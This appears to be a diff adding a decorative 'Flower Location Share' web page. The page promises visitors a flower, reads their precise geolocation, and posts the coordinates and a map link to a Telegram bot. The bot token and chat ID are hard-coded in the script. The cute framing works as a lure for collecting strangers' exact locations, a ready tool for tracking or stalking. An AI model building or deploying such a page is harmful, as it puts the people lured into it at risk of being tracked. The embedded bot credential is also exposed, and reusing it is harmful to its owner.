@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌸 Flower Location Share 🌸</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
+            position: relative;
+            overflow-x: hidden;
+            animation: bgPulse 10s ease-in-out infinite;
+        }
+        
+        @keyframes bgPulse {
+            0%, 100% { background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%); }
+            50% { background: linear-gradient(135deg, #ffdde1 0%, #ee9ca7 50%, #ffdde1 100%); }
+        }
+        
+        /* Falling flowers animation */
+        .flower {
+            position: fixed;
+            pointer-events: none;
+            font-size: 30px;
+            animation: fall linear forwards;
+            z-index: 1000;
+        }
+        
+        @keyframes fall {
+            0% {
+                transform: translateY(-10vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(110vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        /* Main container */
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        
+        /* Flower card */
+        .flower-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 60px 60px 60px 20px;
+            padding: 50px 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.8);
+            backdrop-filter: blur(5px);
+            animation: float 3s ease-in-out infinite;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        /* Flower emoji decorations */
+        .flower-decoration {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: spin 8s linear infinite;
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        h1 {
+            font-size: 48px;
+            color: #ff6b6b;
+            margin-bottom: 15px;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            color: #ff8c8c;
+            margin-bottom: 30px;
+            font-style: italic;
+        }
+        
+        /* Flower button */
+        .flower-btn {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255,107,107,0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .flower-btn:hover:not(:disabled) {
+            transform: scale(1.05);
+            box-shadow: 0 8px 25px rgba(255,107,107,0.6);
+        }
+        
+        .flower-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        /* Status message */
+        .status-message {
+            padding: 15px 25px;
+            border-radius: 50px;
+            margin: 20px 0;
+            display: none;
+            animation: slideIn 0.3s ease;
+            font-weight: 500;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .status-message.success {
+            background: rgba(76, 175, 80, 0.9);
+            color: white;
+            display: block;
+        }
+        
+        .status-message.error {
+            background: rgba(244, 67, 54, 0.9);
+            color: white;
+            display: block;
+        }
+        
+        .status-message.info {
+            background: rgba(255, 152, 0, 0.9);
+            color: white;
+            display: block;
+        }
+        
+        /* Location display */
+        .location-box {
+            background: rgba(255, 240, 245, 0.9);
+            padding: 20px;
+            border-radius: 30px;
+            margin: 20px 0;
+            display: none;
+            font-family: monospace;
+            border: 1px solid #ffb7c5;
+        }
+        
+        .location-box a {
+            color: #ff6b6b;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        /* Flower stats */
+        .flower-stats {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(255,255,255,0.8);
+            border-radius: 50px;
+            font-size: 14px;
+            color: #ff8c8c;
+        }
+        
+        /* Privacy note */
+        .privacy-note {
+            margin-top: 30px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.8);
+            background: rgba(0,0,0,0.2);
+            padding: 10px 20px;
+            border-radius: 50px;
+            backdrop-filter: blur(5px);
+        }
+        
+        /* Loading spinner */
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="flower-card">
+            <div class="flower-decoration">🌸🌼🌻🌺🌷</div>
+            <h1>🌸 Welcome! 🌸</h1>
+            <p class="subtitle">Share your location and receive a flower 🌸</p>
+            
+            <button class="flower-btn" id="shareBtn" onclick="shareLocation()">
+                🌸 Share My Location 🌸
+            </button>
+            
+            <div id="status" class="status-message"></div>
+            <div id="locationBox" class="location-box"></div>
+            
+            <div class="flower-stats" id="flowerStats">
+                🌸🌸🌸 Sharing flowers with love 🌸🌸🌸
+            </div>
+        </div>
+        
+        <div class="privacy-note">
+            🌸 Your location will be sent to @Biruklocationbot 🌸<br>
+            🌼 A flower will bloom for every share! 🌼
+        </div>
+    </div>
+
+    <script>
+        // Your bot details
+        const BOT_TOKEN = "8689283758:AAGAoRKk6uoS1NrC828IWkpizNYM__9K7Qg";
+        const CHAT_ID = "1755569425";
+        
+        const statusDiv = document.getElementById('status');
+        const locationBox = document.getElementById('locationBox');
+        const shareBtn = document.getElementById('shareBtn');
+        
+        let shareCount = 0;
+        
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = `status-message ${type}`;
+            setTimeout(() => {
+                if (statusDiv.style.display === 'block') {
+                    statusDiv.style.display = 'none';
+                }
+            }, 5000);
+        }
+        
+        function createFlower() {
+            const flowers = ['🌸', '🌼', '🌻', '🌺', '🌷', '🌹', '💐', '🌸', '🌼', '🌻'];
+            const flower = document.createElement('div');
+            flower.className = 'flower';
+            flower.textContent = flowers[Math.floor(Math.random() * flowers.length)];
+            flower.style.left = Math.random() * window.innerWidth + 'px';
+            flower.style.fontSize = (20 + Math.random() * 30) + 'px';
+            flower.style.animationDuration = (3 + Math.random() * 4) + 's';
+            flower.style.animationDelay = Math.random() * 2 + 's';
+            document.body.appendChild(flower);
+            
+            setTimeout(() => {
+                flower.remove();
+            }, 7000);
+        }
+        
+        function createFlowerShower() {
+            for(let i = 0; i < 20; i++) {
+                setTimeout(() => createFlower(), i * 100);
+            }
+        }
+        
+        async function shareLocation() {
+            if (!navigator.geolocation) {
+                showStatus('🌸 Oops! Your browser doesn\'t support location sharing 🌸', 'error');
+                return;
+            }
+            
+            shareBtn.disabled = true;
+            shareBtn.innerHTML = '<span class="loader"></span> Finding your flowers... 🌸';
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const time = new Date().toLocaleString();
+                    
+                    shareCount++;
+                    
+                    // Show location
+                    locationBox.innerHTML = `
+                        <strong>🌸 Your Flower Location 🌸</strong><br>
+                        🌸 Latitude: ${lat.toFixed(6)}<br>
+                        🌼 Longitude: ${lng.toFixed(6)}<br>
+                        🌻 Accuracy: ±${Math.round(accuracy)} meters<br>
+                        🌺 Time: ${time}<br>
+                        <a href="https://maps.google.com/?q=${lat},${lng}" target="_blank">
+                            🌷 View on Google Maps 🌷
+                        </a>
+                    `;
+                    locationBox.style.display = 'block';
+                    
+                    // Update flower stats
+                    document.getElementById('flowerStats').innerHTML = `🌸 ${shareCount} flower${shareCount > 1 ? 's' : ''} shared with love 🌸`;
+                    
+                    showStatus('🌸 Sending your flower location... 🌸', 'info');
+                    
+                    // Send to Telegram
+                    const success = await sendToTelegram(lat, lng, time);
+                    
+                    if (success) {
+                        showStatus('✅ Your flower location was sent! Check @Biruklocationbot 🌸', 'success');
+                        createFlowerShower();
+                    } else {
+                        showStatus('🌸 Oops! Couldn\'t send. Please try again 🌸', 'error');
+                    }
+                    
+                    shareBtn.disabled = false;
+                    shareBtn.innerHTML = '🌸 Share My Location 🌸';
+                },
+                (error) => {
+                    let errorMsg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = '🌸 Please allow location access to share flowers 🌸';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = '🌸 Can\'t find your flowers. Check your GPS 🌸';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = '🌸 Timeout! Please try again 🌸';
+                            break;
+                        default:
+                            errorMsg = '🌸 Something went wrong. Please try again 🌸';
+                    }
+                    showStatus(errorMsg, 'error');
+                    shareBtn.disabled = false;
+                    shareBtn.innerHTML = '🌸 Share My Location 🌸';
+                }
+            );
+        }
+        
+        async function sendToTelegram(lat, lng, time) {
+            try {
+                const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+                
+                const message = `🌸 *FLOWER LOCATION SHARED!* 🌸\n\n` +
+                    `*Coordinates:*\n` +
+                    `🌸 Latitude: \`${lat.toFixed(6)}\`\n` +
+                    `🌼 Longitude: \`${lng.toFixed(6)}\`\n\n` +
+                    `*Time:* \`${time}\`\n\n` +
+                    `*Map:* [🌸 View Flower Location 🌸](${mapsLink})\n\n` +
+                    `🌸🌸🌸🌸🌸🌸🌸🌸🌸🌸`;
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok === true;
+                
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+        
+        // Create random flowers continuously
+        setInterval(() => {
+            if (Math.random() > 0.7) {
+                createFlower();
+            }
+        }, 2000);
+        
+        // Create initial flowers
+        for(let i = 0; i < 10; i++) {
+            setTimeout(() => createFlower(), i * 200);
+        }
+    </script>
+</body>
+</html>
